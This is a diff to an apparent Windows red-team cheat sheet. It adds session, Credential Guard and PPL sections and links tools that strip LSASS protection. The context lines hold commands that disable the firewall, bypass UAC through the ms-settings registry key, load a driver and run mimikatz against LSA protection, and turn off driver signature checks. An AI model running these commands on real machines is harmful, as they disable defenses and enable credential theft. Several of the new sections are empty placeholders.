@@ -12,19 +12,24 @@ permalink: /:categories/:title/
 	* 1.1. [OS and KB config](#OSandKBconfig)
 	* 1.2. [network config & file shares](#networkconfigfileshares)
 	* 1.3. [users & groups](#usersgroups)
-	* 1.4. [products, processes and services](#productsprocessesandservices)
+	* 1.4. [active sessions](#activesessions)
+	* 1.5. [products, processes and services](#productsprocessesandservices)
 * 2. [Security Checks](#SecurityChecks)
 	* 2.1. [windows firewall status](#windowsfirewallstatus)
 	* 2.2. [windows defender status](#windowsdefenderstatus)
+	* 2.3. [Credential Guard status](#CredentialGuardstatus)
+	* 2.4. [PPL status](#PPLstatus)
 * 3. [Operating System Tampering](#OperatingSystemTampering)
 	* 3.1. [configure network ip address](#configurenetworkipaddress)
 	* 3.2. [donwload ps activedirectory module](#donwloadpsactivedirectorymodule)
 	* 3.3. [windows defender: disable](#windowsdefender:disable)
 	* 3.4. [windows firewall: disable](#windowsfirewall:disable)
-	* 3.5. [windows uac: bypass](#windowsuac:bypass)
-	* 3.6. [Windows lsaprotection: bypass](#Windowslsaprotection:bypass)
-	* 3.7. [Windows driver signature: disable](#Windowsdriversignature:disable)
-	* 3.8. [SMBv1: enable](#SMBv1:enable)
+	* 3.5. [Credential Guard:](#CredentialGuard:)
+	* 3.6. [PPL: disable](#PPL:disable)
+	* 3.7. [windows uac: bypass](#windowsuac:bypass)
+	* 3.8. [Windows lsaprotection: bypass](#Windowslsaprotection:bypass)
+	* 3.9. [Windows driver signature: disable](#Windowsdriversignature:disable)
+	* 3.10. [SMBv1: enable](#SMBv1:enable)
 * 4. [Operating System Hardening](#OperatingSystemHardening)
 	* 4.1. [LLMNR: disable](#LLMNR:disable)
 	* 4.2. [MS-MSDT: disable](#MS-MSDT:disable)
@@ -84,7 +89,16 @@ net localgroup
 net localgroup Administrators
 ```
 
-###  1.4. <a name='productsprocessesandservices'></a>products, processes and services
+###  1.4. <a name='activesessions'></a>active sessions
+```batch
+# listing the active sessions
+quser
+
+# killign a session / below '2' is the session ID
+logoff 2
+```
+
+###  1.5. <a name='productsprocessesandservices'></a>products, processes and services
 ```powershell
 # listing windows product
 wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:csv
@@ -108,6 +122,20 @@ netsh firewall show portopening
 ```batch
 powershell -inputformat none -outputformat text -NonInteractive -Command 'Get-MpPreference | select -ExpandProperty "DisableRealtimeMonitoring"'
 ```
+
+###  2.3. <a name='CredentialGuardstatus'></a>Credential Guard status
+Reference :
+ - [MSDN - Credential Guard Management](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage)
+```powershell
+# set DWORD value named LsaCfgFlags to 1 to enable Windows Defender Credential Guard with UEFI lock, set it to 2 to enable Windows Defender Credential Guard without lock, and set it to 0 to disable it.
+dir HKLM:\SYSTEM\CurrentControlSet\Control\Lsa*
+# set DWORD value named EnableVirtualizationBasedSecurity to 1 to enable virtualization-based security and set it to 0 to disable it
+# set DWORD value named RequirePlatformSecurityFeatures to 1 to use Secure Boot only or set it to 3 to use Secure Boot and DMA protection
+dir HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard*
+```
+
+###  2.4. <a name='PPLstatus'></a>PPL status
+
 
 ##  3. <a name='OperatingSystemTampering'></a>Operating System Tampering
 
@@ -137,25 +165,39 @@ netsh advfirewall set domainprofile state off
 netsh advfirewall set allprofiles state off
 ```
 
-###  3.5. <a name='windowsuac:bypass'></a>windows uac: bypass
+###  3.5. <a name='CredentialGuard:'></a>Credential Guard: disable 
+```powershell
+```
+
+###  3.6. <a name='PPL:disable'></a>PPL: disable
+
+Tools that disable PPL flags on the LSASS process by patching the EPROCESS kernel 
+ - [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast)
+ - [PPLdump](https://github.com/itm4n/PPLdump)
+ - [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)
+
+```batch
+```
+
+###  3.7. <a name='windowsuac:bypass'></a>windows uac: bypass
 ```batch
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
 ```
 
-###  3.6. <a name='Windowslsaprotection:bypass'></a>Windows lsaprotection: bypass
+###  3.8. <a name='Windowslsaprotection:bypass'></a>Windows lsaprotection: bypass
 ```batch
 powershell .\ConsoleApplication1.exe/InstallDriver
 powershell .\ConsoleApplication1.exe/makeSYSTEMcmd
 powershell .\mimikatz.exe
 ```
 
-###  3.7. <a name='Windowsdriversignature:disable'></a>Windows driver signature: disable
+###  3.9. <a name='Windowsdriversignature:disable'></a>Windows driver signature: disable
 ```batch
 bcdedit.exe /set nointegritychecks on
 bcdedit.exe /set testsigning on
 ```
 
-###  3.8. <a name='SMBv1:enable'></a>SMBv1: enable
+###  3.10. <a name='SMBv1:enable'></a>SMBv1: enable
 ```powershell
 # DISM 
 DISM /online /enable-feature /featurename:SMB1Protocol
